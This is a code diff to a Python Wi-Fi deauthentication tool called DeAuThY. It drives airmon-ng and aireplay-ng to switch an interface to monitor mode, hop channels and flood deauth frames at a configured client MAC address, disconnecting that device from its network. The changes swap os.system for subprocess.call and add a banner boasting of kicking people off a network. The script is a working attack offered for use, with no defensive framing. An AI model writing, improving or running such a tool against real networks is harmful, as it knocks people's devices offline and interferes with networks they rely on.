@@ -1,5 +1,6 @@
-import os
-import random
+from os import system
+from colorama import init, Fore, Back, Style
+from subprocess import call
 
 # Beautiful is better than ugly.
 # Explicit is better than implicit.
@@ -21,6 +22,9 @@ import random
 # If the implementation is easy to explain, it may be a good idea.
 # Namespaces are one honking great idea -- let's do more of those!
 
+def DeAuThY():
+    return Fore.WHITE + "[" + Fore.RED + "D" + Fore.YELLOW + "e" + Fore.LIGHTGREEN_EX + "A" + Fore.MAGENTA + "u" + Fore.CYAN + "T" + Fore.BLUE + "h" + Fore.RED + "Y" + Fore.WHITE + "]"
+
 # config here
 class Config:
     iface_no_mon = "wlo1"
@@ -35,15 +39,40 @@ class Config:
         } 
     STATION = "8C:F5:A3:38:CC:73" # aka client mac address, the device you wish to deauthenticate
 
+def wut():
+    return Fore.WHITE + "[" + Fore.RED + "!" + Fore.WHITE + "]"
+
+def huh():
+    return Fore.WHITE + "[" + Fore.LIGHTBLUE_EX + "?" + Fore.WHITE + "]"
+
+def hey():
+    return Fore.WHITE + "[" + Fore.LIGHTGREEN_EX + "+" + Fore.WHITE + "]"
+
 class deauthy:
     """Main class for the methods"""
+
+    class Appearance:
+
+        def printBanner():
+            print(Fore.RED + """
+
+██████╗ ███████╗     █████╗ ██╗   ██╗████████╗██╗  ██╗██╗   ██╗
+██╔══██╗██╔════╝    ██╔══██╗██║   ██║╚══██╔══╝██║  ██║╚██╗ ██╔╝
+██║  ██║█████╗█████╗███████║██║   ██║   ██║   ███████║ ╚████╔╝ 
+██║  ██║██╔══╝╚════╝██╔══██║██║   ██║   ██║   ██╔══██║  ╚██╔╝  
+██████╔╝███████╗    ██║  ██║╚██████╔╝   ██║   ██║  ██║   ██║   
+╚═════╝ ╚══════╝    ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝   ╚═╝                             
+            """ + Fore.LIGHTGREEN_EX + """
+Time to kick off some assholes from yer net""")
+            return True
+
     class BSSID:
         def deauth(bSSID: str):
             """"""
             channel = Config.BSSIDs[bSSID]
             deauthy.ChannelSys.hopper(channel)
             try:
-                os.system(f"aireplay-ng -0 5 -a {bSSID} -c {Config.STATION} {Config.iface_mon}")
+                out = call(["aireplay-ng", "-0", "5", "-a", bSSID, "-c", Config.STATION, Config.iface_mon])
             except KeyboardInterrupt:
                 deauthy.InterfaceMode.switch("managed")
                 return
@@ -53,7 +82,7 @@ class deauthy:
             channel = Config.ESSID[eSSID]
             deauthy.ChannelSys.hopper(channel)
             try:
-                os.system(f"aireplay-ng -0 5 -a {eSSID} -c {Config.STATION} {Config.iface_mon}")
+                out = call(["aireplay-ng", "-0", "5", "-e", eSSID, "-c", Config.STATION, Config.iface_mon])
             except KeyboardInterrupt:
                 deauthy.InterfaceMode.switch("managed")
                 return
@@ -61,7 +90,7 @@ class deauthy:
     class ChannelSys:
         def hopper(channel_number: int):
             """Hop to a different channel"""
-            os.system(f"airmon-ng start {Config.iface_no_mon}mon {channel_number}")
+            out = call(["airmon-ng", "start", f"{Config.iface_no_mon}mon", f"{channel_number}"])
 
     class InterfaceMode:
         def switch(mode: str):
@@ -69,9 +98,9 @@ class deauthy:
             Accepts either "monitor" or "managed"
             """
             def managed():
-                os.system(f"airmon-ng stop {Config.iface_no_mon}mon")
+                out = call(["airmon-ng", "stop", f"{Config.iface_no_mon}mon"])
             def monitor():
-                os.system(f"airmon-ng start {Config.iface_no_mon}")
+                out = call(["airmon-ng", "start", f"{Config.iface_no_mon}"])
             modes = {
                 "managed":managed,
                 "monitor":monitor,
@@ -90,9 +119,11 @@ def main():
         except KeyboardInterrupt:
             deauthy.InterfaceMode.switch("managed")
             return
+    
+    print(f"{DeAuThY()}{hey()} Hey! Tip of the day: Parrot Security or Kali Linux is recommended! Although, real control freaks use ArchLinux")
 
     deauthy.InterfaceMode.switch("monitor")
-    method = input("Use given ESSID or the list of BSSIDs (BSSID / ESSID)> ")
+    method = input(f"{DeAuThY()}{huh()} Use given ESSID or the list of BSSIDs (BSSID / ESSID)> ")
     if method == "BSSID":
         try:
             do_bssid_method()
@@ -104,6 +135,7 @@ def main():
         return
 
 try:
+    deauthy.Appearance.printBanner()
     main()
 except KeyboardInterrupt:
     deauthy.InterfaceMode.switch("managed")
